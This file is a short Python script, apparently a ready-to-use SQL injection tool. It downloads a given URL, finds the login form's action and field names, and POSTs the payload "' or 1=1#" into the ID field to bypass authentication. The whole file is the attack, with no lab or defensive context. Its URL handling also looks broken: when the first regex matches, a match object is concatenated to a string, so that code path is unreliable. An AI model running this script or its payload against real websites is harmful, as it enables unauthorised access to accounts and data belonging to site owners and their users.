# 

import sys
import requests
from bs4 import BeautifulSoup # beautifulsoup4 module
import re

def help():
    #
    # ./sql-injection url
    #
    #
    print('Usage: ./sql-injection url')
    sys.exit(1)

if(len(sys.argv)!=2):
    help()

url = str(sys.argv[1])

p = re.compile('^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})\/([a-z1-9\.-]+)')
path = p.match(url)
if path == None:
    p = re.compile('^(https?:\/\/)?([\da-z\.-]+)\/([a-z\.-]+)')
    path = p.match(url).group()
print("\nCurrent path = " + path)

# Get request
r = requests.get(url).text
soup = BeautifulSoup(r, 'html.parser')

# Find next page, id and pw(transmit via POST method)
form_tag = soup.form
action_page = form_tag.get('action')
id_value = soup.select('form input')[0]['name']
pw_value = soup.select('form input')[1]['name']
print("\nAction page = " + action_page)
print("ID = " + id_value + "\nPW = " + pw_value)

# SQL Injection
next_url = path + '/' + action_page
print("\nNext URL = " + next_url)
sqlinjection = "\' or 1=1#"
params = {id_value:sqlinjection}

# Send post packet
resp = requests.post(next_url, data=params)
print(resp.text)



# main url regex reference
# ^(https?:\/\/)?([\da-z\.-]+)\.([a-z\.]{2,6})
